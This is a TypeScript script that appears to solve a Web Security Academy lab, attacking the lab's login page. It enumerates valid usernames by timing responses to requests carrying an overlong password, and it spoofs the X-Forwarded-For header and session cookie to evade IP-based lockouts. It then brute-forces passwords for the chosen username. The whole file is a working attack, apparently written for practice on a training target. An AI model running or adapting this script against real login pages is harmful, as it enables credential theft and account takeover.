import axios from "axios";
import * as fs from "fs";
// import crypto from "crypto";
// import fetch from "node-fetch";

const subdomain = "ac1c1f9f1fe4fac2c0995d9800b40033";
const loginURL = `https://${subdomain}.web-security-academy.net/login`;

const attack = async () => {
  const usernameCandidates = fs
    .readFileSync(__dirname + "/username_candidates.txt")
    .toString()
    .split("\n");

  const passwordCandidates = fs
    .readFileSync(__dirname + "/password_candidates.txt")
    .toString()
    .split("\n");

  let validUsername;
  let responseData;
  let responseStatusText;
  let responseStatus;
  const totalResponseTimePerUsernameCandidate = {};
  usernameCandidates.forEach((usernameCandidate) => {
    totalResponseTimePerUsernameCandidate[usernameCandidate] = 0;
  });
  const attempts = 10;
  for (let i = 0; i < attempts; i++) {
    for (let usernameCandidate of usernameCandidates) {
      try {
        const requestTime = new Date().getTime() / 1000;
        const response = await axios.post(
          loginURL,
          `username=${usernameCandidate}&password=123dfnksakfsakjfjsakhjfhkdasfhklhalkdsfhklafshkldsahjkfkhjasfkhjashjflkhjalshkfjlsakdhjfhjdasflkjdsajkfldskalfhjlaksdfjdjsahlfjlkashfdklsahflkasdfjhldkashfldksafhdlsakjfhjlaksfhaslkjfhjlkasdfhaslkfhaslkfhlkasfhlkasfhldashflsahfjlsa`,
          {
            headers: {
              Cookie:
                `session=maejAV5dPYdwMWrFkaxJGcQBtgRjIHlu` +
                i +
                usernameCandidate,
              "X-Forwarded-For": i + usernameCandidate + "random",
            },
          }
        );
        console.log(response.data);
        const timeOfResponse = new Date().getTime() / 1000;
        console.log(
          usernameCandidate,
          new Date().getTime() / 1000 - requestTime
        );

        const responseTime = timeOfResponse - requestTime;

        totalResponseTimePerUsernameCandidate[usernameCandidate] +=
          responseTime;
      } catch (e) {
        console.log(e);
        throw e;
      }
    }
  }

  const findVariance = (arr = []) => {
    if (!arr.length) {
      return 0;
    }
    const sum = arr.reduce((acc, val) => acc + val);
    const { length: num } = arr;
    const median = sum / num;
    let variance = 0;
    arr.forEach((num) => {
      variance += (num - median) * (num - median);
    });
    variance /= num;
    return variance;
  };

  // Object.keys(totalResponseTimePerUsernameCandidate).forEach((username) => {
  //   totalResponseTimePerUsernameCandidate[username] = findVariance(
  //     totalResponseTimePerUsernameCandidate[username]
  //   );
  // });

  const getMax = (object: Object) => {
    let max = Math.max(...Object.values(object));
    return Object.keys(object).filter((key) => object[key] == max)[0];
  };
  const getMin = (object: Object) => {
    let max = Math.min(...Object.values(object));
    return Object.keys(object).filter((key) => object[key] == max)[0];
  };
  // console.log(totalResponseTimePerUsernameCandidate);
  const sortable = Object.fromEntries(
    // @ts-ignore
    Object.entries(totalResponseTimePerUsernameCandidate).sort(
      // @ts-ignore
      ([, a], [, b]) => a - b
    )
  );

  console.log(sortable);
  validUsername = getMax(totalResponseTimePerUsernameCandidate);
  console.log("Username with highest response time is: ", validUsername);

  for (let passwordCandidate of passwordCandidates) {
    console.log(`username=${validUsername}&password=${passwordCandidate}`);
    const response = await axios.post(
      loginURL,
      `username=${validUsername}&password=${passwordCandidate}`,
      {
        headers: {
          Cookie:
            `session=maejAV5dPYdwMWrFkaxJGcQBtgRjIHlu` + passwordCandidate,
          "X-Forwarded-For": passwordCandidate,
        },
      }
    );
    // console.log(response.data);

    if (
      !response.data.includes("Invalid username or password.") &&
      !response.data.includes("You have made too many incorrect login attempts")
    ) {
      console.log(
        "Username and password is: ",
        validUsername,
        " ",
        passwordCandidate
      );
      break;
    }
  }
};

try {
  attack();
} catch (e) {
  console.log(e);
  throw e;
}
